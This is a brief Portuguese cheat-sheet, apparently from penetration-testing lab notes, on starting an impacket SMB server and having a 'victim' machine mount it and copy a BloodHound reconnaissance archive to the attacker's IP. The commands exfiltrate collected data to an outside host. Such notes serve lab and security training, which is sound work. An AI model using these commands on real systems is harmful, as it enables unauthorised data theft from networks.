smbserver
========================


transferindo arquivos para uma outra maquina:

    impacket-smbserver smb .
    
    impacket-smbserver -smb2support smb .
    
Com usuário e senha

    impacket-smbserver -username test -password test smb .
    
    impacket-smbserver -smb2support -username test -password test smb .
 
 Na máquina vítima temos que montar ada seguinte maneira:
 
     net use \\10.10.14.17\smb /user:test test
 
 Para transferir os arquivos, basta utilizarmos o comandoo:
 
     copy 20240206162822_BloodHound.zip \\10.10.14.17\smb\sh.zip